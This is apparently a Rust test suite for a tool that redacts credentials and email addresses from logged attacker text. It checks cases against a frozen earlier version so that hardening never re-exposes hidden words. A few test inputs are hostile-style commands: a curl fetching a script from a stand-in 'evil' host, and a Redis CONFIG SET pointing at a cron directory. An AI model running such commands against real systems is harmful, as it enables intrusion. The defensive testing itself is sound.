//! One table of redaction cases (#34, #16): input, expected output and
//! kind of text. Every case is also run through a frozen copy of the
//! redaction that shipped in #75 (`frozen_main`, below, never edited), and
//! any word that version hid must stay hidden now, unless the case is
//! listed as a deliberate reduction with a reason. This keeps hardening
//! from quietly undoing earlier redaction.

use std::collections::BTreeMap;

use foiled_core::redact::{TextKind, redact_as};

/// The redaction from PR #75 (`crates/core/src/ioc.rs` on main at
/// 5da5c56), frozen as the baseline. Do not edit.
#[allow(dead_code, clippy::all)]
mod frozen_main {
    const REDACTED: &str = "REDACTED";

    /// A parameter, field or header whose name contains one of these (ignoring
    /// case) has its value treated as a secret: `password`, `X-Api-Key`,
    /// `X-Amz-Signature`, `db_passwd`, `sessid`.
    const SECRET_KEY_PARTS: &[&str] = &[
        "secret",
        "token",
        "password",
        "passwd",
        "pwd",
        "api-key",
        "api_key",
        "apikey",
        "private_key",
        "private-key",
        "privatekey",
        "signature",
        "session",
        "sessid",
        "auth",
        "credential",
        "cookie",
        "jwt",
    ];

    /// Names that are secrets only as a whole word (`pass=`, `key=`), because
    /// as substrings they would hit ordinary names (`passport`, `monkey`).
    const SECRET_KEY_WORDS: &[&str] = &["pass", "key", "sig", "sid"];

    /// Longest parameter or header name considered.
    const MAX_KEY_CHARS: usize = 48;

    fn secret_key(name: &str) -> bool {
        let k = name.trim_start_matches('-').to_ascii_lowercase();
        SECRET_KEY_WORDS.contains(&k.as_str()) || SECRET_KEY_PARTS.iter().any(|p| k.contains(p))
    }

    /// Command-line flags whose next word is a secret.
    const SECRET_FLAGS: &[&str] = &[
        "--api-key",
        "--apikey",
        "--pass",
        "--password",
        "--secret",
        "--token",
        "bearer",
        "basic",
    ];

    /// Protocol commands whose arguments are credentials.
    const SECRET_COMMANDS: &[&str] = &["AUTH", "LOGIN", "PASS"];

    /// Remove secrets and personal information from attacker text: URL
    /// credentials, secret-looking parameters and flags, bearer tokens and the
    /// local part of email addresses. Returns the new text and whether anything
    /// changed. Linear in the input.
    pub fn redact(s: &str) -> (String, bool) {
        let out = redact_emails(&redact_pairs(&redact_flags(&redact_userinfo(s))));
        let changed = out != s;
        (out, changed)
    }

    fn redact_userinfo(s: &str) -> String {
        let mut out = String::with_capacity(s.len());
        let mut rest = s;
        while let Some(i) = rest.find("://") {
            let (head, tail) = rest.split_at(i + 3);
            out.push_str(head);
            let end = tail
                .find(|c: char| matches!(c, '/' | '?' | '#' | '\'' | '"') || c.is_whitespace())
                .unwrap_or(tail.len());
            let authority = &tail[..end];
            match authority.rfind('@') {
                Some(at) => {
                    out.push_str(REDACTED);
                    out.push_str(&authority[at..]);
                }
                None => out.push_str(authority),
            }
            rest = &tail[end..];
        }
        out.push_str(rest);
        out
    }

    fn value_end(c: char) -> bool {
        matches!(c, '&' | ';' | '\'' | '"' | '#' | ',' | '}' | ']') || c.is_whitespace()
    }

    fn key_char(c: char) -> bool {
        c.is_ascii_alphanumeric() || matches!(c, '_' | '-')
    }

    /// Redact the value after a secret-looking name in query strings
    /// (`password=x`), headers (`X-Api-Key: x`) and JSON (`"password":"x"`).
    /// The name is matched by [`secret_key`]. Look-back is bounded, so this is
    /// linear in the input.
    fn redact_pairs(s: &str) -> String {
        let mut out = String::with_capacity(s.len());
        let mut chars = s.chars().peekable();
        while let Some(c) = chars.next() {
            out.push(c);
            if c != '=' && c != ':' {
                continue;
            }
            let before = &out[..out.len() - 1];
            // JSON keys end with a quote before the colon.
            let quoted = c == ':' && (before.ends_with('"') || before.ends_with('\''));
            let name_end = before.len() - usize::from(quoted);
            let key_len = before[..name_end]
                .chars()
                .rev()
                .take(MAX_KEY_CHARS + 1)
                .take_while(|ch| key_char(*ch))
                .count();
            if key_len == 0 || key_len > MAX_KEY_CHARS {
                continue;
            }
            let key = &before[name_end - key_len..name_end];
            let starts_word = before[..name_end - key_len]
                .chars()
                .next_back()
                .is_none_or(|p| {
                    matches!(p, '?' | '&' | ';' | '\'' | '"' | '{' | ',' | '(' | '[')
                        || p.is_whitespace()
                });
            if !starts_word || !secret_key(key) {
                continue;
            }
            // A header or JSON value may follow spaces and an opening quote.
            if c == ':' {
                while chars.peek().is_some_and(|n| *n == ' ' || *n == '\t') {
                    out.push(chars.next().unwrap_or(' '));
                }
            }
            let quote = match chars.peek() {
                Some(&q @ ('"' | '\'')) => {
                    out.push(q);
                    chars.next();
                    Some(q)
                }
                _ => None,
            };
            let mut skipped = false;
            while let Some(&n) = chars.peek() {
                let end = match quote {
                    Some(q) => n == q,
                    None => value_end(n),
                };
                if end {
                    break;
                }
                chars.next();
                skipped = true;
            }
            if skipped {
                out.push_str(REDACTED);
            }
        }
        out
    }

    fn redact_flags(s: &str) -> String {
        let mut out = String::with_capacity(s.len());
        let mut redact_next = false;
        for piece in s.split_inclusive(char::is_whitespace) {
            let word = piece.trim_end();
            let tail = &piece[word.len()..];
            if redact_next && !word.is_empty() {
                out.push_str(REDACTED);
                out.push_str(tail);
                redact_next = false;
                continue;
            }
            out.push_str(piece);
            let w = word
                .trim_matches(|c| matches!(c, '\'' | '"'))
                .to_ascii_lowercase();
            if SECRET_FLAGS.contains(&w.as_str()) {
                redact_next = true;
            }
        }
        out
    }

    /// Replace the local part of email addresses, written plainly or with the
    /// `@` URL-encoded (`%40`).
    fn redact_emails(s: &str) -> String {
        let local_char =
            |c: char| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '%' | '+' | '-');
        let mut out = String::with_capacity(s.len());
        for (i, c) in s.char_indices() {
            let sep = if c == '@' {
                1
            } else if c == '%' && s[i..].get(..3).is_some_and(|x| x == "%40") {
                3
            } else {
                0
            };
            if sep > 0 {
                let domain: String = s[i + sep..]
                    .chars()
                    .take(254)
                    .take_while(|d| d.is_ascii_alphanumeric() || matches!(d, '.' | '-'))
                    .collect();
                let domain = domain.trim_end_matches('.');
                let tld_ok = domain.rsplit_once('.').is_some_and(|(_, tld)| {
                    tld.len() >= 2 && tld.bytes().all(|b| b.is_ascii_alphabetic())
                });
                let local_len = out
                    .chars()
                    .rev()
                    .take(65)
                    .take_while(|ch| local_char(*ch))
                    .count();
                if tld_ok && (1..=64).contains(&local_len) {
                    let local = &out[out.len() - local_len..];
                    if local != REDACTED {
                        out.truncate(out.len() - local_len);
                        out.push_str(REDACTED);
                    }
                }
            }
            out.push(c);
        }
        out
    }
}

use TextKind::{CommandLine as Cmd, Text};

/// `(input, expected, kind)`.
const CASES: &[(&str, &str, TextKind)] = &[
    // Query strings and config lines, any case and position.
    (
        "/login?user=bob&password=hunter2&x=1",
        "/login?user=bob&password=REDACTED&x=1",
        Text,
    ),
    ("/a?token=abc", "/a?token=REDACTED", Text),
    ("/a?mytoken=abc", "/a?mytoken=REDACTED", Text),
    (
        "/a?PassWord=abc&monkey=1",
        "/a?PassWord=REDACTED&monkey=1",
        Text,
    ),
    (
        "/a?db_passwd=x&pass=y&key=z",
        "/a?db_passwd=REDACTED&pass=REDACTED&key=REDACTED",
        Text,
    ),
    (
        "/a?Api-Key=x&private_key=y&sessid=z",
        "/a?Api-Key=REDACTED&private_key=REDACTED&sessid=REDACTED",
        Text,
    ),
    (
        "/a?X-Auth-Token=x&basic_auth=y&db_pass=z",
        "/a?X-Auth-Token=REDACTED&basic_auth=REDACTED&db_pass=REDACTED",
        Text,
    ),
    (
        "/a?authkey=abc123&dbpwd=hunter2",
        "/a?authkey=REDACTED&dbpwd=REDACTED",
        Text,
    ),
    (
        "/a?adminpwd=x1&authcode=x2&oauth_state=x3",
        "/a?adminpwd=REDACTED&authcode=REDACTED&oauth_state=REDACTED",
        Text,
    ),
    (
        "/a?authorization=x4&sid=x5&sig=x6",
        "/a?authorization=REDACTED&sid=REDACTED&sig=REDACTED",
        Text,
    ),
    (
        "/b?X-Amz-Credential=AKIDEXAMPLE&X-Amz-Signature=abc123&X-Amz-Date=1",
        "/b?X-Amz-Credential=REDACTED&X-Amz-Signature=REDACTED&X-Amz-Date=1",
        Text,
    ),
    ("db_password = hunter2", "db_password = REDACTED", Text),
    (
        "/a?jwt=e1.e2.e3&cookie=c1&session=s1",
        "/a?jwt=REDACTED&cookie=REDACTED&session=REDACTED",
        Text,
    ),
    // JSON: any case, spaces around the colon, escapes.
    (
        r#"{"user":"bob","password":"hunter2","n":1}"#,
        r#"{"user":"bob","password":"REDACTED","n":1}"#,
        Text,
    ),
    (
        r#"{"Password" : "x y"}"#,
        r#"{"Password" : "REDACTED"}"#,
        Text,
    ),
    (r#"{"apiToken": 12345}"#, r#"{"apiToken": REDACTED}"#, Text),
    (r#"{"secret":"a\"b c"}"#, r#"{"secret":"REDACTED"}"#, Text),
    // Headers: with or without a space, whole value in text.
    ("X-Api-Key: abc123", "X-Api-Key: REDACTED", Text),
    ("X-Api-Key: k1 k2", "X-Api-Key: REDACTED", Text),
    ("Authentication: abc", "Authentication: REDACTED", Text),
    ("password:hunter2", "password:REDACTED", Text),
    ("token:12345", "token:REDACTED", Text),
    ("cookie: sid=abc", "cookie: REDACTED", Text),
    (
        "Authorization: Bearer abc.def",
        "Authorization: REDACTED",
        Text,
    ),
    (
        "Authorization: Basic dXNlcjpwdw==",
        "Authorization: REDACTED",
        Text,
    ),
    // Headers in command lines end where the shell word ends.
    (
        "curl -H token:abc http://a.example.invalid/",
        "curl -H token:REDACTED http://a.example.invalid/",
        Cmd,
    ),
    (
        "curl -H 'Authorization:Bearer abc' http://a.example.invalid/",
        "curl -H 'Authorization:REDACTED' http://a.example.invalid/",
        Cmd,
    ),
    (
        "curl -H 'X-Api-Key: k1 k2' http://a.example.invalid/",
        "curl -H 'X-Api-Key: REDACTED' http://a.example.invalid/",
        Cmd,
    ),
    (
        "token: x; curl http://evil.example.invalid/p.sh",
        "token: REDACTED; curl http://evil.example.invalid/p.sh",
        Cmd,
    ),
    (
        "export TOKEN=abc && curl http://a.example.invalid/",
        "export TOKEN=REDACTED && curl http://a.example.invalid/",
        Cmd,
    ),
    // URL userinfo, user and password, as in #75.
    (
        "curl http://u:p@203.0.113.9/x",
        "curl http://REDACTED@203.0.113.9/x",
        Cmd,
    ),
    (
        "mysql://root:hunter2@db.example.invalid/x",
        "mysql://REDACTED@db.example.invalid/x",
        Text,
    ),
    (
        "redis://:hunter2@203.0.113.9:6379",
        "redis://REDACTED@203.0.113.9:6379",
        Text,
    ),
    (
        "https://ghp_abc@git.example.invalid/x",
        "https://REDACTED@git.example.invalid/x",
        Text,
    ),
    // Secret flags, any program; quoted values masked whole.
    (
        "mysql --password hunter2 -h db",
        "mysql --password REDACTED -h db",
        Cmd,
    ),
    ("app --password=hunter2", "app --password=REDACTED", Cmd),
    (
        "app --password 'my secret' -v",
        "app --password 'REDACTED' -v",
        Cmd,
    ),
    (
        "app --password=\"my secret\" -v",
        "app --password=\"REDACTED\" -v",
        Cmd,
    ),
    ("app --token \"t1 t2\"", "app --token \"REDACTED\"", Cmd),
    (
        "openssl enc -d -pass pass:hunter2",
        "openssl enc -d -pass REDACTED",
        Cmd,
    ),
    // Program password flags, wherever the program is.
    (
        "mysql -uroot -phunter2 -h 203.0.113.9",
        "mysql -uroot -pREDACTED -h 203.0.113.9",
        Cmd,
    ),
    ("mysql -p\"hunter 2\" db", "mysql -pREDACTED db", Cmd),
    (
        "sudo mysqldump -phunter2 db",
        "sudo mysqldump -pREDACTED db",
        Cmd,
    ),
    ("MYSQL=1 mysql -phunter2", "MYSQL=1 mysql -pREDACTED", Cmd),
    ("env X=1 mysql -phunter2", "env X=1 mysql -pREDACTED", Cmd),
    (
        "env -i X=1 mysql -phunter2",
        "env -i X=1 mysql -pREDACTED",
        Cmd,
    ),
    (
        "sudo -u root mysql -phunter2",
        "sudo -u root mysql -pREDACTED",
        Cmd,
    ),
    (
        "timeout 5 mysql -phunter2",
        "timeout 5 mysql -pREDACTED",
        Cmd,
    ),
    (
        "timeout -s KILL 5 nice -n 5 mysql -phunter2",
        "timeout -s KILL 5 nice -n 5 mysql -pREDACTED",
        Cmd,
    ),
    ("echo x;mysql -phunter2", "echo x;mysql -pREDACTED", Cmd),
    (
        "echo x && mysql -phunter2 || true",
        "echo x && mysql -pREDACTED || true",
        Cmd,
    ),
    ("ls | mysql -phunter2", "ls | mysql -pREDACTED", Cmd),
    ("echo x\nmysql -phunter2", "echo x\nmysql -pREDACTED", Cmd),
    ("/usr/bin/mysql -phunter2", "/usr/bin/mysql -pREDACTED", Cmd),
    (
        "sh -c 'sshpass -p hunter2 ssh x'",
        "sh -c 'sshpass -p REDACTED ssh x'",
        Cmd,
    ),
    (
        "bash -lc \"mysql -phunter2\"",
        "bash -lc \"mysql -pREDACTED\"",
        Cmd,
    ),
    (
        "sshpass -p hunter2 ssh root@203.0.113.9",
        "sshpass -p REDACTED ssh root@203.0.113.9",
        Cmd,
    ),
    ("sshpass -phunter2 ssh x", "sshpass -pREDACTED ssh x", Cmd),
    (
        "redis-cli -h 203.0.113.9 -a hunter2 info",
        "redis-cli -h 203.0.113.9 -a REDACTED info",
        Cmd,
    ),
    (
        "mosquitto_pub -u x -P hunter2 -t t",
        "mosquitto_pub -u x -P REDACTED -t t",
        Cmd,
    ),
    ("unzip -P hunter2 a.zip", "unzip -P REDACTED a.zip", Cmd),
    ("7z x -phunter2 a.7z", "7z x -pREDACTED a.7z", Cmd),
    // User and password pairs, separate or attached.
    (
        "curl -u admin:hunter2 http://a.example.invalid/",
        "curl -u admin:REDACTED http://a.example.invalid/",
        Cmd,
    ),
    (
        "curl -uadmin:hunter2 http://a.example.invalid/",
        "curl -uadmin:REDACTED http://a.example.invalid/",
        Cmd,
    ),
    (
        "curl --user=admin:hunter2 x",
        "curl --user=admin:REDACTED x",
        Cmd,
    ),
    (
        "curl --user admin:hunter2 x",
        "curl --user admin:REDACTED x",
        Cmd,
    ),
    (
        "curl --user 'admin:hunter 2' x",
        "curl --user 'admin:REDACTED' x",
        Cmd,
    ),
    (
        "smbclient //h/s -U admin%hunter2",
        "smbclient //h/s -U admin%REDACTED",
        Cmd,
    ),
    // Not secrets: other programs' -p, flags without values.
    ("mkdir -p /tmp/x", "mkdir -p /tmp/x", Cmd),
    (
        "ssh -p 2222 root@203.0.113.9",
        "ssh -p 2222 root@203.0.113.9",
        Cmd,
    ),
    ("mysql -p db", "mysql -p db", Cmd),
    ("mysql -uroot db", "mysql -uroot db", Cmd),
    ("sort -u x", "sort -u x", Cmd),
    // Emails, plain and URL-encoded.
    (
        "mail admin@example.invalid now",
        "mail REDACTED@example.invalid now",
        Text,
    ),
    (
        "/subscribe?to=admin%40example.invalid",
        "/subscribe?to=REDACTED%40example.invalid",
        Text,
    ),
    ("ssh root@203.0.113.9", "ssh root@203.0.113.9", Cmd),
    // Deliberately kept (see REDUCED).
    ("/blog?author=bob", "/blog?author=bob", Text),
    (
        "PasswordAuthentication=no",
        "PasswordAuthentication=no",
        Text,
    ),
    (
        "sed -i s/x/y/ PasswordAuthentication yes",
        "sed -i s/x/y/ PasswordAuthentication yes",
        Cmd,
    ),
    // No host:port exception: a secret-named label fails closed, a URL or
    // dotted host never names a secret.
    ("curl auth-server:8080/x", "curl auth-server:REDACTED", Cmd),
    ("X-Auth-Pin: 1234", "X-Auth-Pin: REDACTED", Text),
    ("session-id:12345", "session-id:REDACTED", Text),
    ("api_key_id:12345", "api_key_id:REDACTED", Text),
    (
        "curl auth.example.invalid:8080/x",
        "curl auth.example.invalid:8080/x",
        Cmd,
    ),
    // `author` and `authors` only, as whole parts.
    (
        "/a?authorkey=k1&authority=k2&AuthorKey=k3",
        "/a?authorkey=REDACTED&authority=REDACTED&AuthorKey=REDACTED",
        Text,
    ),
    (
        "/a?authors=bob&authorName=al&author_id=7",
        "/a?authors=bob&authorName=al&author_id=7",
        Text,
    ),
    // Switch values only for configuration keywords that take them.
    (
        "password=none&pass=no&pwd=off",
        "password=REDACTED&pass=REDACTED&pwd=REDACTED",
        Text,
    ),
    ("PermitEmptyPasswords=no", "PermitEmptyPasswords=no", Text),
    (
        "PasswordAuthentication=hunter2",
        "PasswordAuthentication=REDACTED",
        Text,
    ),
    // Unclosed quotes: the rest of the line is still checked.
    (
        "it's here; curl --token abc",
        "it's here; curl --token REDACTED",
        Cmd,
    ),
    (
        "'unclosed --password hunter2",
        "'unclosed --password REDACTED",
        Cmd,
    ),
    (
        "echo don't; curl -u admin:hunter2 x",
        "echo don't; curl -u admin:REDACTED x",
        Cmd,
    ),
    (
        "echo \"oops; mysql -phunter2",
        "echo \"oops; mysql -pREDACTED",
        Cmd,
    ),
    ("it's --password hunter2", "it's --password REDACTED", Text),
    ("don't token=abc", "don't token=REDACTED", Text),
    // Subshells, substitutions and groups.
    (
        "(cd /tmp; mysql -phunter2)",
        "(cd /tmp; mysql -pREDACTED)",
        Cmd,
    ),
    (
        "x=$(mysql -phunter2 -e 'select 1')",
        "x=$(mysql -pREDACTED -e 'select 1')",
        Cmd,
    ),
    ("{ mysql -phunter2; }", "{ mysql -pREDACTED; }", Cmd),
    ("`mysql -phunter2`", "`mysql -pREDACTED`", Cmd),
    (
        "if mysql -phunter2; then echo ok; fi",
        "if mysql -pREDACTED; then echo ok; fi",
        Cmd,
    ),
    (
        "curl http://auth-server:8080/x",
        "curl http://auth-server:8080/x",
        Cmd,
    ),
    // Unchanged.
    (
        "http://stage2.example.invalid:8080/x",
        "http://stage2.example.invalid:8080/x",
        Text,
    ),
    ("/plain/path", "/plain/path", Text),
    (
        "Mozilla/5.0 (compatible; demo-scanner/2.1)",
        "Mozilla/5.0 (compatible; demo-scanner/2.1)",
        Text,
    ),
];

/// Cases where #75 hid something that is now shown on purpose, with why.
const REDUCED: &[(&str, &str)] = &[
    (
        "/blog?author=bob",
        "`author` is not `auth`: a name, not a credential",
    ),
    (
        "PasswordAuthentication=no",
        "a setting word after a config keyword, not a secret",
    ),
    (
        "/a?authors=bob&authorName=al&author_id=7",
        "`author` and `authors` as whole name parts are not `auth`",
    ),
    (
        "PermitEmptyPasswords=no",
        "a switch value of an sshd configuration keyword, not a secret",
    ),
];

fn words(s: &str) -> BTreeMap<String, usize> {
    let mut m = BTreeMap::new();
    for w in s
        .split(|c: char| !c.is_ascii_alphanumeric())
        .filter(|w| w.len() >= 2)
    {
        *m.entry(w.to_string()).or_default() += 1;
    }
    m
}

#[test]
fn redaction_table() {
    let mut failures = Vec::new();
    for (input, want, kind) in CASES {
        let (got, changed) = redact_as(input, *kind);
        if got != *want {
            failures.push(format!("{input:?}\n   want {want:?}\n    got {got:?}"));
        }
        assert_eq!(changed, input != want, "{input}");
    }
    assert!(failures.is_empty(), "\n{}", failures.join("\n"));
}

#[test]
fn nothing_main_hid_is_shown_again() {
    let mut failures = Vec::new();
    for (input, _, kind) in CASES {
        let (old, _) = frozen_main::redact(input);
        let (new, _) = redact_as(input, *kind);
        let (before, old_w, new_w) = (words(input), words(&old), words(&new));
        for (w, n) in &before {
            let kept_old = old_w.get(w).copied().unwrap_or(0);
            let kept_new = new_w.get(w).copied().unwrap_or(0);
            if kept_old < *n && kept_new > kept_old && !REDUCED.iter().any(|(c, _)| c == input) {
                failures.push(format!("{input:?}: #75 hid {w:?}, now shown: {new:?}"));
            }
        }
    }
    assert!(failures.is_empty(), "\n{}", failures.join("\n"));
    // Every reduction is still a case, so its reason stays reviewed.
    for (c, _) in REDUCED {
        assert!(CASES.iter().any(|(i, _, _)| i == c), "{c}");
    }
}

/// Protocol commands, as tokens joined by spaces: `(input, expected)`.
const COMMANDS: &[(&str, &str)] = &[
    ("AUTH hunter2", "AUTH REDACTED"),
    ("AUTH default hunter2", "AUTH REDACTED REDACTED"),
    ("AUTH a b hunter2", "AUTH REDACTED REDACTED REDACTED"),
    ("LOGIN bob hunter2", "LOGIN REDACTED REDACTED"),
    ("PASS hunter2", "PASS REDACTED"),
    (
        "HELLO 3 AUTH default hunter2",
        "HELLO 3 AUTH REDACTED REDACTED",
    ),
    ("HELLO 3 AUTH hunter2", "HELLO 3 AUTH REDACTED"),
    (
        "HELLO 3 AUTH default hunter2 SETNAME cli",
        "HELLO 3 AUTH REDACTED REDACTED SETNAME cli",
    ),
    ("HELLO 3 SETNAME cli", "HELLO 3 SETNAME cli"),
    (
        "MIGRATE 192.0.2.10 6379 k 0 5000 AUTH hunter2",
        "MIGRATE 192.0.2.10 6379 k 0 5000 AUTH REDACTED",
    ),
    (
        "MIGRATE 192.0.2.10 6379 k 0 5000 AUTH2 u hunter2",
        "MIGRATE 192.0.2.10 6379 k 0 5000 AUTH2 REDACTED REDACTED",
    ),
    (
        "MIGRATE 192.0.2.10 6379 k 0 5000 AUTH2 hunter2",
        "MIGRATE 192.0.2.10 6379 k 0 5000 AUTH2 REDACTED",
    ),
    (
        "CONFIG SET requirepass hunter2",
        "CONFIG SET requirepass REDACTED",
    ),
    (
        "CONFIG SET masterauth hunter2 dir /tmp",
        "CONFIG SET masterauth REDACTED dir /tmp",
    ),
    (
        "CONFIG SET requirepass hunter2 extra",
        "CONFIG SET requirepass REDACTED REDACTED",
    ),
    (
        "CONFIG SET dir /var/spool/cron",
        "CONFIG SET dir /var/spool/cron",
    ),
    (
        "SENTINEL SET m auth-pass hunter2",
        "SENTINEL SET m auth-pass REDACTED",
    ),
    (
        "ACL SETUSER bob on >hunter2 #abcd ~*",
        "ACL SETUSER bob on >REDACTED #REDACTED ~*",
    ),
    (
        "XYZZY PASSWORD hunter2 api_key=abc",
        "XYZZY PASSWORD REDACTED api_key=REDACTED",
    ),
    ("XYZZY x AUTH2 hunter2", "XYZZY x AUTH2 REDACTED"),
    ("ACL SETUSER >hunter2", "ACL SETUSER >REDACTED"),
    ("ACL SETUSER #abcd on", "ACL SETUSER #REDACTED on"),
    ("GET k", "GET k"),
];

/// What #75 did to a protocol command: every argument of AUTH, LOGIN and
/// PASS hidden, nothing else.
fn frozen_main_command(line: &str) -> String {
    let mut it = line.splitn(2, ' ');
    let cmd = it.next().unwrap_or("");
    match it.next() {
        Some(_) if ["AUTH", "LOGIN", "PASS"].contains(&cmd.to_ascii_uppercase().as_str()) => {
            format!("{cmd} REDACTED")
        }
        _ => line.to_string(),
    }
}

#[test]
fn command_table_and_nothing_main_hid() {
    let mut failures = Vec::new();
    for (input, want) in COMMANDS {
        let mut tokens: Vec<String> = input.split(' ').map(str::to_string).collect();
        for i in foiled_core::redact::secret_arg_positions(&tokens) {
            tokens[i] = foiled_core::redact::mask_secret_arg(&tokens[i]);
        }
        let got = tokens.join(" ");
        if got != *want {
            failures.push(format!("{input:?}\n   want {want:?}\n    got {got:?}"));
        }
        let old = frozen_main_command(input);
        let (before, old_w, new_w) = (words(input), words(&old), words(&got));
        for (w, n) in &before {
            let kept_old = old_w.get(w).copied().unwrap_or(0);
            if kept_old < *n && new_w.get(w).copied().unwrap_or(0) > kept_old {
                failures.push(format!("{input:?}: #75 hid {w:?}, now shown: {got:?}"));
            }
        }
    }
    assert!(failures.is_empty(), "\n{}", failures.join("\n"));
}

#[test]
fn redaction_stays_linear_on_hostile_command_lines() {
    // Compare the time for n and 4n bytes rather than an absolute limit, so a
    // loaded machine slows both sides alike. Linear work gives a ratio near 4;
    // quadratic work gives about 16.
    const CHUNKS: [&str; 11] = [
        "--password ",
        "sh -c '",
        "\"",
        "a=b;",
        "token: ",
        "x:y ",
        "sudo -u ",
        "\\",
        "@",
        "%40",
        "-u",
    ];
    fn best_of_three(len: usize) -> std::time::Duration {
        let inputs: Vec<String> = CHUNKS.iter().map(|c| c.repeat(len / c.len())).collect();
        (0..3)
            .map(|_| {
                let started = std::time::Instant::now();
                for s in &inputs {
                    for kind in [TextKind::Text, TextKind::CommandLine] {
                        let _ = redact_as(s, kind);
                    }
                }
                started.elapsed()
            })
            .min()
            .unwrap()
    }
    let small = best_of_three(20_000);
    let large = best_of_three(80_000);
    let ratio = large.as_secs_f64() / small.as_secs_f64().max(1e-6);
    assert!(
        ratio < 10.0,
        "4x input took {ratio:.1}x as long ({small:?} -> {large:?})"
    );
}
